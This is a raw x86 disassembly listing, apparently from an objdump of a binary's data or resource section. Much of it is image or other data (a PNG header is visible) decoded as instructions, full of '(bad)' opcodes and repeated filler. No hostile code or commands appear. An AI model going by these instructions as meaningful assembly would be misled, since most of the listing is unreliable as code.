  414b3e:	loop   0x414b40
  414b40:	add    dh,BYTE PTR [edx-0x1a]
  414b43:	add    BYTE PTR [edx],bl
  414b45:	scas   al,BYTE PTR es:[edi]
  414b46:	inc    BYTE PTR [eax]
  414b48:	add    cl,BYTE PTR [esi-0x4d41ff06]
  414b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b4f:	add    BYTE PTR [edx],al
  414b51:	ds mov edx,0xced6de00
  414b57:	add    BYTE PTR [edx],al
  414b59:	xchg   edx,eax
  414b5a:	cli    
  414b5b:	add    dl,cl
  414b5d:	mov    dl,0x0
  414b60:	add    ch,BYTE PTR [edx-0x12]
  414b63:	add    dh,dl
  414b65:	rol    dh,cl
  414b67:	add    BYTE PTR [edx],al
  414b69:	jle    0x414b61
  414b6b:	add    BYTE PTR [edx],al
  414b6d:	(bad)  
  414b6e:	(bad)  
  414b6f:	add    dh,al
  414b71:	retf   0xce
  414b74:	add    ah,BYTE PTR [esi-0x1a]
  414b77:	add    BYTE PTR [edx+0x200cab6],bl
  414b7d:	outs   dx,BYTE PTR ds:[esi]
  414b7e:	out    0x0,al
  414b80:	add    bh,BYTE PTR [edx-0xe]
  414b83:	add    BYTE PTR [edx-0x1dff253e],ch
  414b89:	(bad)  
  414b8b:	add    BYTE PTR [edx],al
  414b8d:	jb     0x414b7d
  414b8f:	add    BYTE PTR [edx],al
  414b91:	inc    esi
  414b92:	mov    edx,0xfe9e1a00
  414b97:	add    BYTE PTR [edx],al
  414b99:	jle    0x414b95
  414b9b:	add    BYTE PTR [esi],cl
  414b9d:	dec    esi
  414b9e:	mov    dl,0x0
  414ba0:	sbb    bh,BYTE PTR [esi-0x3d31ff02]
  414ba6:	mov    dl,0x0
  414ba8:	add    ch,BYTE PTR [edx-0x16]
  414bab:	add    dh,dl
  414bad:	into   
  414bae:	mov    BYTE PTR [eax],0x2
  414bb1:	pop    edx
  414bb2:	fiadd  DWORD PTR [eax]
  414bb4:	jbe    0x414b58
  414bb6:	retf   0xe00
  414bb9:	jbe    0x414ba9
  414bbb:	add    BYTE PTR [esi-0x19ff313e],dh
  414bc1:	(bad)  
  414bc3:	add    BYTE PTR [edx],al
  414bc5:	(bad)  
  414bc7:	add    BYTE PTR [edx],bl
  414bc9:	mov    dh,0xfe
  414bcb:	add    BYTE PTR [edx],ch
  414bcd:	mov    gs,edx
  414bcf:	add    dl,al
  414bd1:	mov    dh,0xa6
  414bd3:	add    dl,dl
  414bd5:	retf   0xbe
  414bd8:	fcmovbe st,st(2)
  414bda:	retf   0xe00
  414bdd:	xor    dl,0x0
  414be0:	add    ah,BYTE PTR [esi-0x22]
  414be3:	add    BYTE PTR [edx],al
  414be5:	jmp    0xcab6:0x9e00
  414beb:	add    BYTE PTR [edx],al
  414bed:	jb     0x414be1
  414bef:	add    BYTE PTR [edx],al
  414bf1:	dec    edx
  414bf2:	ret    0x1a00
  414bf5:	mov    ds:0xfe,al
	...
  414f06:	add    BYTE PTR [eax],al
  414f08:	cmp    al,0x3c
  414f0a:	cmp    bh,BYTE PTR [edx]
  414f0c:	cmp    bh,BYTE PTR [edx]
  414f0e:	cmp    bh,BYTE PTR [edx]
  414f10:	cmp    bh,BYTE PTR [edx]
  414f12:	cmp    bh,BYTE PTR [edx]
  414f14:	cmp    bh,BYTE PTR [edx]
  414f16:	cmp    al,0x3c
  414f18:	cmp    al,0x26
  414f1a:	xor    BYTE PTR [eax],dh
  414f1c:	mov    db4,ebx
  414f1f:	and    esp,DWORD PTR [ebx]
  414f21:	cmp    edi,DWORD PTR [ebx]
  414f23:	lsl    esp,WORD PTR [esi]
  414f26:	es cmp al,0x3c
  414f29:	adc    BYTE PTR [eax],dl
  414f2b:	adc    BYTE PTR [edx],cl
  414f2d:	add    eax,0x2116371b
  414f32:	or     bl,BYTE PTR [esi]
  414f34:	adc    BYTE PTR [eax],dl
  414f36:	adc    BYTE PTR [esp+edi*1],bh
  414f39:	cmp    al,0x36
  414f3b:	cmp    ch,BYTE PTR ss:[edx]
  414f3e:	das    
  414f3f:	sbb    esp,DWORD PTR [ecx]
  414f41:	and    DWORD PTR ds:0x3c361922,ecx
  414f47:	cmp    al,0x3c
  414f49:	cmp    al,0x3c
  414f4b:	or     BYTE PTR ds:0x2d0b3801,ah
  414f51:	sbb    al,0x2
  414f53:	add    BYTE PTR [edx],dl
  414f55:	cmp    al,0x3c
  414f57:	cmp    al,0x3c
  414f59:	cmp    al,0x3c
  414f5b:	cmp    al,0x25
  414f5d:	daa    
  414f5e:	sub    DWORD PTR [edi],edx
  414f60:	pop    ss
  414f61:	xor    esi,DWORD PTR [edx]
  414f63:	and    eax,0x3c3c3c3c
  414f68:	cmp    al,0x3c
  414f6a:	cmp    al,0x3c
  414f6c:	cmp    al,0x27
  414f6e:	push   es
  414f6f:	sbb    bl,BYTE PTR [edx]
  414f71:	adc    eax,0x3c3c3c27
  414f76:	cmp    al,0x3c
  414f78:	cmp    al,0x3c
  414f7a:	cmp    al,0x3c
  414f7c:	cmp    al,0x7
  414f7e:	pop    es
  414f7f:	sub    al,0x35
  414f81:	pop    es
  414f82:	pop    es
  414f83:	cmp    al,0x3c
  414f85:	cmp    al,0x3c
  414f87:	cmp    al,0x3c
  414f89:	cmp    al,0x3c
  414f8b:	cmp    al,0x3c
  414f8d:	and    DWORD PTR ds:0x210a1839,ebx
  414f93:	cmp    al,0x3c
  414f95:	cmp    al,0x3c
  414f97:	cmp    al,0x3c
  414f99:	cmp    al,0x3c
  414f9b:	cmp    al,0x3c
  414f9d:	cmp    al,0x5
  414f9f:	cmp    DWORD PTR [eax],ebx
  414fa1:	add    eax,0x3c3c3c3c
  414fa6:	cmp    al,0x3c
  414fa8:	cmp    al,0x3c
  414faa:	cmp    al,0x3c
  414fac:	cmp    al,0x3c
  414fae:	sub    ebx,DWORD PTR [edi]
  414fb0:	pop    ds
  414fb1:	or     DWORD PTR [esp+edi*1],edi
  414fb4:	cmp    al,0x3c
  414fb6:	cmp    al,0x3c
  414fb8:	cmp    al,0x3c
  414fba:	cmp    al,0x3c
  414fbc:	cmp    al,0x3c
  414fbe:	add    al,0x2e
  414fc0:	or     al,0x11
  414fc2:	cmp    al,0x3c
  414fc4:	cmp    al,0x3c
  414fc6:	cmp    al,0x3c
  414fc8:	cmp    al,0x3c
  414fca:	cmp    al,0x3c
  414fcc:	cmp    al,0x3c
  414fce:	xor    DWORD PTR [eax],esp
  414fd0:	adc    esi,DWORD PTR [ecx]
  414fd2:	cmp    al,0x3c
  414fd4:	cmp    al,0x3c
  414fd6:	cmp    al,0x3c
  414fd8:	cmp    al,0x3c
  414fda:	cmp    al,0x3c
  414fdc:	cmp    al,0x3c
  414fde:	cmp    al,0x31
  414fe0:	xor    DWORD PTR [esp+edi*1],edi
  414fe3:	cmp    al,0x3c
  414fe5:	cmp    al,0x3c
  414fe7:	cmp    al,0x3c
  414fe9:	cmp    al,0x3c
  414feb:	cmp    al,0x3c
  414fed:	cmp    al,0x3c
  414fef:	push   cs
  414ff0:	push   cs
  414ff1:	cmp    al,0x3c
  414ff3:	cmp    al,0x3c
  414ff5:	cmp    al,0x3c
  414ff7:	cmp    al,0x3c
  414ff9:	cmp    al,0x3c
  414ffb:	cmp    al,0x3c
  414ffd:	cmp    al,0x3c
  414fff:	cmp    al,0x3c
  415001:	cmp    al,0x3c
  415003:	cmp    al,0x3c
  415005:	cmp    al,0x3c
  415007:	cmp    al,0xc0
  415009:	add    eax,DWORD PTR [eax]
  41500b:	add    BYTE PTR [eax-0x7fffffff],al
  415011:	add    DWORD PTR [eax],eax
  415013:	add    al,al
  415015:	add    eax,DWORD PTR [eax]
  415017:	add    al,ah
  415019:	pop    es
  41501a:	add    BYTE PTR [eax],al
  41501c:	lock sldt WORD PTR [eax]
  415020:	clc    
  415021:	pop    ds
  415022:	add    BYTE PTR [eax],al
  415024:	clc    
  415025:	pop    ds
  415026:	add    BYTE PTR [eax],al
  415028:	clc    
  415029:	pop    ds
  41502a:	add    BYTE PTR [eax],al
  41502c:	cld    
  41502d:	aas    
  41502e:	add    BYTE PTR [eax],al
  415030:	cld    
  415031:	aas    
  415032:	add    BYTE PTR [eax],al
  415034:	cld    
  415035:	aas    
  415036:	add    BYTE PTR [eax],al
  415038:	cld    
  415039:	aas    
  41503a:	add    BYTE PTR [eax],al
  41503c:	(bad)  
  41503d:	jg     0x41503f
  41503f:	add    dh,bh
  415041:	jg     0x415043
  415043:	add    bh,bh
  415045:	inc    DWORD PTR [eax]
  415047:	add    BYTE PTR [ecx+0xd474e50],cl
  41504d:	or     bl,BYTE PTR [edx]
  41504f:	or     al,BYTE PTR [eax]
  415051:	add    BYTE PTR [eax],al
  415053:	or     eax,0x52444849
  415058:	add    BYTE PTR [eax],al
  41505a:	add    DWORD PTR [eax],eax
  41505c:	add    BYTE PTR [eax],al
  41505e:	add    DWORD PTR [eax],eax
  415060:	or     BYTE PTR [esi],al
  415062:	add    BYTE PTR [eax],al
  415064:	add    BYTE PTR [edx+esi*2-0x58],bl
  415068:	data16 add BYTE PTR [eax],al
  41506b:	and    BYTE PTR [eax],al
  41506d:	dec    ecx
  41506e:	inc    esp
  41506f:	inc    ecx
  415070:	push   esp
  415071:	js     0x41500f
  415073:	in     al,dx
  415074:	mov    ebp,0x596c9079
  415079:	pop    esi
  41507a:	fcomip st,st(7)
  41507c:	cmp    DWORD PTR [edi-0x31],esi
  41507f:	fwait
  415080:	sti    
  415081:	push   edx
  415082:	pop    ecx
  415083:	sti    
  415084:	pop    esi
  415085:	cmc    
  415086:	mov    dh,0x7e
  415088:	(bad)  [edi-0x17]
  41508b:	out    dx,al
  41508c:	jmp    0x671fea2f
  415091:	xor    DWORD PTR [ebx-0x6f7fcccc],esi
  415097:	mov    WORD PTR ds:0x450b1b6,ds
  41509d:	or     al,BYTE PTR [edi]
  41509f:	sub    DWORD PTR ds:0x92c0a487,0x8b09b25
  4150a9:	pop    es
  4150aa:	add    cl,BYTE PTR [ebp-0x4f7f0f7f]
  4150b0:	shl    BYTE PTR [edx+0x11],0x21
  4150b4:	cmp    eax,DWORD PTR [esi+ebx*1]
  4150b7:	arpl   WORD PTR [ebx],cx
  4150b9:	sbb    DWORD PTR [esi+eax*4],eax
  4150bc:	xor    BYTE PTR [eax],dh
  4150be:	int3   
  4150bf:	ret    0xf4f4
  4150c2:	cli    
  4150c3:	(bad)  
  4150c4:	pop    edx
  4150c5:	pop    edi
  4150c6:	in     eax,dx
  4150c7:	imul   edx,DWORD PTR [esi+0x66],0x56
  4150cb:	out    dx,al
  4150cc:	retf   
  4150cd:	pop    ebp
  4150ce:	cld    
  4150cf:	(bad)  
  4150d0:	mov    ebp,0x6b5f3337
  4150d5:	nop
  4150d6:	add    cl,ch
  4150d8:	jnp    0x415089
  4150da:	fisub  WORD PTR [ebx-0x14ddc811]
  4150e0:	push   esi
  4150e1:	out    0x5d,al
  4150e3:	repnz sahf 
  4150e5:	jae    0x4150d9
  4150e7:	idiv   ebp
  4150e9:	lods   eax,DWORD PTR ds:[esi]
  4150ea:	out    0x5c,eax
  4150ec:	or     BYTE PTR [ecx],dl
  4150ee:	and    al,BYTE PTR [eax+ecx*4+0x10]
  4150f2:	and    DWORD PTR [edx-0x7c],eax
  4150f5:	or     BYTE PTR [ecx],dl
  4150f7:	and    al,BYTE PTR [eax+ecx*4+0x10]
  4150fb:	and    DWORD PTR [edx+0x7c],eax
  4150fe:	adc    BYTE PTR [eax],ah
  415100:	into   
  415101:	cli    
  415102:	push   es
  415103:	inc    edx
  415104:	cmp    al,0x1c
  415106:	cld    
  415107:	into   
  415108:	ja     0x4150cf
  41510a:	je     0x415155
  41510c:	xchg   edi,eax
  41510d:	out    0x9d,al
  41510f:	pop    edx
  415110:	imul   DWORD PTR [ecx]
  415112:	pop    ecx
  415113:	mov    ah,0xc6
  415115:	nop
  415116:	adc    al,bl
  415118:	mov    cl,0xb1
  41511a:	dec    esp
  41511b:	fisubr DWORD PTR [edx+0x76ac24ee]
  415121:	aaa    
  415122:	jmp    0x2421:0x8dae9858
  415129:	cmp    al,BYTE PTR [edx-0x5f]
  41512c:	sub    DWORD PTR [ebx-0x7276aaae],ebp
  415132:	(bad)  
  415133:	jmp    0x1e9c:0xeb92b547
  41513a:	retf   
  41513b:	pop    edx
  41513c:	jl     0x41514d
  41513e:	lds    ebx,FWORD PTR [ebp+0x56]
  415141:	mov    ds:0xfb1f3bd9,al
  415146:	xchg   ebp,eax
  415147:	int    0xfa
  415149:	pop    ecx
  41514a:	mov    bh,0x27
  41514c:	vpermil2ps xmm0,xmm7,XMMWORD PTR [eax],xmm7,0xf
  415152:	shl    eax,0x3b
  415155:	fbstp  TBYTE PTR [edi]
  415157:	je     0x4151b6
  415159:	in     eax,dx
  41515a:	push   esp
  41515b:	call   FWORD PTR [edx+0x529fba26]
  415161:	push   ebp
  415162:	addr16 push esp
  415164:	push   ss
  415165:	inc    esp
  415166:	test   esp,esp
  415168:	or     BYTE PTR [ebx],0xb6
  41516b:	add    eax,0x70170242
  415170:	pop    ebp
  415171:	out    dx,eax
  415172:	jg     0x41513b
  415174:	test   dh,0x73
  415177:	sbb    eax,0xa102c70
  41517c:	mov    eax,0xe05b1c02
  415181:	inc    eax
  415182:	(bad)  
  415183:	mov    dh,0x95
  415185:	and    edx,DWORD PTR [edi+0x31]
  415188:	mov    esi,0x7e35acdc
  41518d:	in     eax,0xf3
  41518f:	mov    edi,0x99deff67
  415194:	ss les eax,FWORD PTR cs:[ebx]
  415198:	inc    edi
  415199:	dec    eax
  41519a:	add    BYTE PTR [edi-0x7f],bh
  41519d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519f:	xlat   BYTE PTR ds:[ebx]
  4151a0:	mov    WORD PTR [edi],ds
  4151a2:	sahf   
  4151a3:	popf   
  4151a4:	call   0x6173b6a7
  4151a9:	inc    edi
  4151aa:	ins    BYTE PTR es:[edi],dx
  4151ab:	pop    es
  4151ac:	ficomp DWORD PTR [ebp-0x50]
  4151af:	ins    DWORD PTR es:[edi],dx
  4151b0:	out    dx,eax
  4151b1:	in     eax,0xba
  4151b3:	std    
  4151b4:	pop    ss
  4151b5:	fdivr  QWORD PTR [edi-0x2f5b87eb]
  4151bb:	sti    
  4151bc:	fadd   QWORD PTR ds:0x92010804
  4151c2:	add    BYTE PTR [edi-0x5f4912f5],ah
  4151c8:	sub    ah,BYTE PTR [edi+ebx*4-0x2009ad8f]
  4151cf:	cli    
  4151d0:	cld    
  4151d1:	aas    
  4151d2:	ret    
  4151d3:	jns    0x4151c9
  4151d5:	lods   eax,DWORD PTR ds:[esi]
  4151d6:	or     esi,ecx
  4151d8:	xor    BYTE PTR [eax-0x7bf20a64],ah
  4151de:	js     0x415210
  4151e0:	clc    
  4151e1:	cmc    
  4151e2:	out    dx,eax
  4151e3:	int3   
  4151e4:	jle    0x4151d5
  4151e6:	mov    BYTE PTR [edx-0xe],dh
  4151e9:	inc    ebp
  4151ea:	rol    DWORD PTR [eax],cl
  4151ec:	popa   
  4151ed:	inc    ebx
  4151ee:	inc    esp
  4151ef:	test   DWORD PTR [eax+0x640bede1],ebx
  4151f5:	fidiv  DWORD PTR [ecx-0x43]
  4151f8:	xlat   BYTE PTR ds:[ebx]
  4151f9:	sti    
  4151fa:	dec    ecx
  4151fb:	inc    eax
  4151fc:	add    BYTE PTR [eax-0x22],cl
  4151ff:	adc    BYTE PTR ss:[edx-0x1f],bh
  415203:	jp     0x41525b
  415205:	adc    ebp,0x5a0b5681
  41520b:	mov    dl,0x8b
  41520d:	pop    ebp
  41520e:	mov    ch,0xff
  415210:	jmp    0x4151b5
  415212:	jge    0x4151b7
  415214:	add    ch,BYTE PTR [ebp+0xde47d1f]
  41521a:	or     al,0xf1
  41521c:	push   eax
  41521d:	adc    BYTE PTR [edx+0x0],bl
  415220:	jg     0x415223
  415222:	lock mov edi,0x4cb9df7d
  415228:	lods   al,BYTE PTR ds:[esi]
  415229:	mov    esp,0xa678cef1
  41522e:	xor    ebp,DWORD PTR [ecx+0x405110ab]
  415234:	push   ebp
  415235:	inc    eax
  415236:	xchg   ebx,eax
  415237:	inc    ecx
  415238:	rol    DWORD PTR [eax-0x6f],1
  41523b:	cmp    al,0xd3
  41523d:	pop    esi
  41523e:	sub    BYTE PTR [eax],ah
  415240:	leave  
  415241:	js     0x415205
  415243:	out    dx,al
  415244:	or     edi,DWORD PTR [edx+ebp*4]
  415247:	idiv   DWORD PTR [edi]
  415249:	mov    ds:0x702c75bf,al
  41524e:	cmp    ah,BYTE PTR [eax-0x49]
  415251:	mov    eax,ds:0xd5a84db
  415256:	push   0xd
  415258:	test   al,0xb7
  41525a:	loope  0x4151fc
  41525c:	test   al,0x74
  41525e:	(bad)  
  41525f:	lds    ecx,FWORD PTR [edi]
  415261:	jge    0x41525b
  415263:	repz aas 
  415265:	not    ebp
  415267:	mov    bh,0xce
  415269:	mov    ah,0xd1
  41526b:	and    DWORD PTR [esi],ebx
  41526d:	or     BYTE PTR [ebx+esi*4-0x20ef7e42],ah
  415274:	ds pushf 
  415276:	push   0xfffffff5
  415278:	xchg   DWORD PTR [ecx+edi*4+0x33],ecx
  41527c:	imul   edi,DWORD PTR [ebx],0x1c76e69e
  415282:	iret   
  415283:	or     cl,BYTE PTR [eax]
  415285:	pop    esi
  415286:	scas   al,BYTE PTR es:[edi]
  415287:	or     eax,0xcffde58
  41528c:	jl     0x4152bc
  41528e:	pop    esp
  41528f:	jg     0x41521c
  415291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415292:	cmc    
  415293:	add    edi,DWORD PTR [edi]
  415295:	inc    eax
  415296:	sub    BYTE PTR [eax],ah
  415298:	push   esp
  415299:	jg     0x4152c6
  41529b:	sub    DWORD PTR [ecx+eax*4],0xffffffe2
  41529f:	outs   dx,DWORD PTR ds:[esi]
  4152a0:	dec    ebp
  4152a1:	fst    st(2)
  4152a3:	sub    cl,bl
  4152a5:	mov    bh,0xff
  4152a7:	(bad)  
  4152a8:	fnstenv [ebp+0x4483c436]
  4152ae:	dec    eax
  4152af:	add    BYTE PTR [edi+0x38],cl
  4152b2:	jle    0x415299
  4152b4:	das    
  4152b5:	pop    esi
  4152b7:	mov    ch,0x76
  4152b9:	loope  0x4152c2
  4152bb:	lds    edx,FWORD PTR gs:[ebx]
  4152be:	je     0x415297
  4152c0:	test   BYTE PTR [edx*2-0x3f6a3eaa],0xb5
  4152c8:	add    bh,bl
  4152ca:	iret   
  4152cb:	(bad)  
  4152cc:	cmc    
  4152cd:	test   dh,bl
  4152cf:	repz pop es
  4152d1:	call   0xf70359cf
  4152d6:	int    0xfe
  4152d8:	add    BYTE PTR [esp+eax*1],0x3d
  4152dc:	mov    eax,DWORD PTR [eax-0x6e]
  4152df:	jge    0x41534c
  4152e1:	shl    DWORD PTR [edi+0xd],0x34
  4152e5:	or     eax,0xf5f946a4
  4152ea:	pop    edi
  4152eb:	std    
  4152ec:	sahf   
  4152ed:	int3   
  4152ee:	xor    esp,DWORD PTR [edi-0x2b]
  4152f1:	out    0x10,al
  4152f3:	femms  
  4152f5:	and    DWORD PTR [ecx],eax
  4152f7:	cmp    al,0xe1
  4152f9:	mov    al,0x2b
  4152fb:	xchg   ebp,eax
  4152fc:	out    dx,eax
  4152fd:	mov    ch,BYTE PTR [edx]
  4152ff:	(bad)  
  415300:	xchg   esp,eax
  415301:	sub    al,0xf9
  415303:	add    bl,BYTE PTR [edx]
  415305:	add    esp,DWORD PTR [ebx+0x8]
  415308:	xchg   esp,eax
  415309:	cmp    al,0x68
  41530b:	ret    
  41530c:	and    BYTE PTR [edx+0x1e2e71de],ah
  415312:	cmp    DWORD PTR [eax],edi
  415314:	mov    dh,0x67
  415316:	loop   0x4152d3
  415318:	mov    fs,WORD PTR [edi+0x29]
  41531b:	xor    BYTE PTR [edi+0x409f2db5],0x7c
  415322:	sub    eax,DWORD PTR [edx-0x20]
  415325:	pop    es
  415326:	or     eax,0x27c901
  41532b:	lock enter 0xaa25,0xa2
  415330:	imul   esi,DWORD PTR [edx-0x1a],0xd6fa3eaf
  415337:	xchg   BYTE PTR [eax-0x30],bh
  41533a:	or     BYTE PTR [ecx],cl
  41533c:	loopne 0x415347
  41533e:	xchg   esp,ebx
  415340:	push   0x7f
  415342:	mov    edi,0x4048bb2a
  415347:	and    al,0x9
  415349:	jp     0x41531d
  41534b:	dec    ebx
  41534c:	jecxz  0x415357
  41534e:	cmp    al,0x13
  415350:	pop    esi
  415351:	dec    esi
  415352:	xor    DWORD PTR [eax],0xffffffe8
  415355:	imul   edi,DWORD PTR [edi+eiz*4+0x2f],0xffffffcc
  41535a:	inc    edx
  41535b:	clc    
  41535c:	out    dx,al
  41535d:	cmp    edi,0x74141079
  415363:	sub    al,0x7f
  415365:	mov    edi,0x24902b1f
  41536a:	nop
  41536b:	gs nop
  41536d:	adc    eax,0x98886550
  415372:	rcr    dl,1
  415374:	pop    ebx
  415375:	(bad)  
  415376:	fidivr WORD PTR [edi-0x6]
  415379:	stc    
  41537a:	jl     0x415378
  41537c:	adc    DWORD PTR [edi],esi
  41537e:	aaa    
  41537f:	les    eax,FWORD PTR [ebx]
  415381:	inc    esi
  415382:	dec    eax
  415383:	add    BYTE PTR [edi+0x30],cl
  415386:	(bad)  
  415387:	xlat   BYTE PTR ds:[ebx]
  415388:	iret   
  415389:	setg   BYTE PTR [edi]
  41538c:	and    eax,0x24965e7
  415391:	push   ebp
  415392:	repz mov ah,0x3f
  415395:	add    ebx,edx
  415397:	(bad)  [ecx-0xb67210f]
  41539d:	repz jbe 0x415332
  4153a0:	das    
  4153a1:	call   0x8085af88
  4153a6:	std    
  4153a7:	jae    0x41532e
  4153a9:	fsubr  QWORD PTR [edi+0x48f17015]
  4153af:	inc    eax
  4153b0:	xchg   esi,eax
  4153b1:	mov    esp,0xf1782260
  4153b6:	add    BYTE PTR [ebx+0x76],dl
  4153b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ba:	pushf  
  4153bb:	jbe    0x4153a0
  4153bd:	push   ebx
  4153be:	movsx  edx,WORD PTR [ebp+0x42261e21]
  4153c5:	add    bh,BYTE PTR [eax-0x7e]
  4153c8:	mov    eax,ds:0x9ad3e23a
  4153cd:	jo     0x4153db
  4153cf:	add    DWORD PTR [eax-0x3075c0ef],ebp
  4153d5:	sub    BYTE PTR [edi],0x8f
  4153d8:	mov    bh,0x95
  4153da:	je     0x41542b
  4153dc:	test   al,0x83
  4153de:	test   DWORD PTR [edx],0x777d4cf
  4153e4:	loop   0x4153e6
  4153e6:	mov    ?,edi
  4153e8:	jg     0x41543a
  4153ea:	sub    esp,DWORD PTR [eax]
  4153ec:	test   bh,ah
  4153ee:	dec    DWORD PTR [ebx+0x52]
  4153f1:	fild   WORD PTR ds:0x9200e208
  4153f7:	add    BYTE PTR [ebp+0x1],cl
  4153fa:	rcl    DWORD PTR [ebp-0x492e0442],1
  415400:	cmp    ah,al
  415402:	add    DWORD PTR [esi+0x48],0x0
  415406:	dec    edi
  415407:	xor    ch,BYTE PTR [edx-0x575d401b]
  41540d:	sahf   
  41540e:	jbe    0x4153e6
  415410:	or     al,0x10
  415412:	mov    esi,0x76fc0f9a
  415417:	mov    al,ds:0xf843d017
  41541c:	ret    0xf4ed
  41541f:	add    eax,0xc1f0d03c
  415424:	popa   
  415425:	sar    DWORD PTR [ecx-0x3a2f5fbf],0x17
  41542c:	jl     0x41546d
  41542e:	sbb    BYTE PTR [eax],ch
  415430:	or     DWORD PTR [edi-0x5],ecx
  415433:	sub    esi,DWORD PTR [edx]
  415435:	sbb    BYTE PTR [edx],bh
  415437:	enter  0xcead,0xa7
  41543b:	jle    0x415430
  41543d:	outs   dx,DWORD PTR ds:[esi]
  41543e:	jl     0x415466
  415440:	repz enter 0x1bda,0xe2
  415445:	and    DWORD PTR [ebx],0x14278024
  41544b:	mov    edi,0x1733bdf4
  415450:	or     al,0xc9
  415452:	mov    edx,0xa8a0c8ae
  415457:	pop    esi
  415458:	aam    0xbf
  41545a:	push   edi
  41545b:	les    edx,FWORD PTR [ebx]
  41545d:	sbb    al,0x14
  41545f:	or     BYTE PTR [edx-0x60],dh
  415462:	jmp    0x9db7b5e4
  415467:	add    edi,ebx
  415469:	fild   WORD PTR [edi+0x20959e10]
  41546f:	push   es
  415470:	sbb    BYTE PTR [ecx-0x78],al
  415473:	not    DWORD PTR [ecx+0x163f080]
  415479:	jle    0x4154c7
  41547b:	inc    eax
  41547c:	adc    ebp,DWORD PTR [ebp+0x7fdbdedc]
  415482:	hlt    
  415483:	mov    DWORD PTR [edi-0x29],eax
  415486:	jmp    0x3c01:0x211a0f10
  41548d:	mov    eax,ds:0xefc52a70
  415492:	nop
  415493:	pop    ebp
  415494:	sub    esp,DWORD PTR [edx]
  415496:	dec    ecx
  415497:	mov    al,ds:0x7753f41b
  41549c:	mov    ds:0x6083ddaf,al
  4154a1:	pop    ds
  4154a2:	ss mov ebp,0x7305f20
  4154a8:	inc    eax
  4154a9:	enter  0x1503,0x81
  4154ad:	js     0x4154dd
  4154af:	and    BYTE PTR [ebx+0xd],0x58
  4154b3:	add    al,0x1
  4154b5:	and    DWORD PTR [esi+eiz*4],eax
  4154b8:	jg     0x41544a
  4154ba:	adc    al,ah
  4154bc:	daa    
  4154bd:	add    BYTE PTR [ecx],cl
  4154bf:	je     0x4154d6
  4154c1:	test   ch,ch
  4154c3:	jle    0x4154bb
  4154c5:	adc    DWORD PTR [edi],esi
  4154c7:	cmp    eax,0x484403c4
  4154cc:	add    BYTE PTR [edi+0x28],cl
  4154cf:	xor    al,0x94
  4154d1:	iret   
  4154d2:	jmp    0x55d6fc61
  4154d7:	sbb    eax,0x3fb220e4
  4154dc:	loopne 0x41548d
  4154de:	imul   DWORD PTR [eax+eax*1]
  4154e1:	mov    edi,0xac0a4016
  4154e6:	add    esp,edi
  4154e8:	lods   eax,DWORD PTR ds:[esi]
  4154e9:	jg     0x415477
  4154eb:	cmp    edx,DWORD PTR [eax-0x54417fe7]
  4154f1:	sub    bl,0x57
  4154f4:	push   cs
  4154f5:	cli    
  4154f6:	xchg   esi,eax
  4154f7:	test   esp,ebp
  4154f9:	mov    DWORD PTR [ebx],0x405e124
  4154ff:	push   ebp
  415500:	add    eax,0xc4f9d734
  415505:	scas   eax,DWORD PTR es:[edi]
  415506:	push   eax
  415508:	repz mov cl,0x47
  41550b:	fdiv   st,st(4)
  41550d:	adc    BYTE PTR [edi],cl
  41550f:	adc    BYTE PTR [ecx],ah
  415511:	add    DWORD PTR [ecx+eax*4],edi
  415514:	clc    
  415515:	lds    edi,FWORD PTR [edi-0x4ad6c1cc]
  41551b:	retf   
  41551c:	iret   
  41551d:	or     ecx,ebx
  41551f:	dec    ebx
  415520:	retf   
  415521:	sub    DWORD PTR [edx+0x34aaeb27],ebx
  415527:	nop
  415528:	mov    edi,0x3c69fa77
  41552d:	push   es
  41552e:	xor    al,0xfd
  415530:	pusha  
  415531:	sub    al,0x0
  415533:	(bad)  
  415534:	dec    edi
  415535:	sbb    DWORD PTR [edx-0x123f34ff],ecx
  41553b:	iret   
  41553c:	sbb    eax,0x28783f00
  415541:	jnp    0x415569
  415543:	jmp    DWORD PTR [eax-0x5fb75fcb]
  415549:	sub    BYTE PTR [eax],ah
  41554b:	pop    ecx
  41554c:	popf   
  41554d:	mov    edx,ebp
  41554f:	fdivrp st(1),st
  415551:	dec    ebx
  415552:	(bad)  
  415553:	mov    esp,0x103c4213
  415558:	test   BYTE PTR [eax+esi*8],al
  41555b:	add    al,0x42
  41555d:	mov    dh,0x78
  41555f:	dec    ebp
  415560:	jno    0x4154fe
  415562:	xchg   esp,eax
  415563:	and    al,0xbc
  415565:	hlt    
  415566:	pop    edi
  415567:	mov    al,ds:0x42fa1df5
  41556c:	das    
  41556d:	sub    edi,DWORD PTR [eax-0x3e]
  415570:	push   cs
  415571:	std    
  415572:	hlt    
  415573:	sahf   
  415574:	das    
  415575:	mov    esp,0x982e3fc2
  41557a:	add    ah,ah
  41557c:	ror    BYTE PTR [edi-0x7c51fbf5],cl
  415582:	sar    BYTE PTR [edi],0xdf
  415585:	icebp  
  415586:	into   
  415587:	jno    0x415590
  415589:	loop   0x41558b
  41558b:	xor    DWORD PTR [ebp-0x379f3560],0x396d90ae
  415595:	mov    WORD PTR [ebx],es
  415597:	cmp    al,0xa1
  415599:	or     BYTE PTR [ecx],cl
  41559b:	loopne 0x4155e6
  41559d:	inc    esp
  41559e:	lods   eax,DWORD PTR ds:[esi]
  41559f:	(bad)  
  4155a0:	sub    DWORD PTR [ebp-0xb],ecx
  4155a3:	dec    ebp
  4155a4:	icebp  
  4155a5:	add    BYTE PTR [eax],0xf0
  4155a8:	fadd   QWORD PTR [eax+0xc2f7a60]
  4155ae:	dec    esp
  4155af:	in     eax,dx
  4155b0:	mov    ch,0x6
  4155b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155b3:	add    edi,DWORD PTR [ebx]
  4155b5:	std    
  4155b6:	jge    0x4155f9
  4155b8:	cmp    dl,BYTE PTR [eax-0x8]
  4155bb:	fcmovu st,st(7)
  4155bd:	lds    edx,FWORD PTR [ebx]
  4155bf:	je     0x4155c7
  4155c1:	(bad)  
  4155c2:	sbb    eax,0x7ec82b88
  4155c7:	pushf  
  4155c8:	inc    ecx
  4155c9:	mov    ds:0x9888071f,al
  4155ce:	push   eax
  4155cf:	(bad)  
  4155d1:	clc    
  4155d2:	hlt    
  4155d3:	dec    edi
  4155d4:	jg     0x4155fa
  4155d6:	and    DWORD PTR [edi+0x3c4336ff],edi
  4155dc:	dec    BYTE PTR [eax]
  4155de:	or     eax,esp
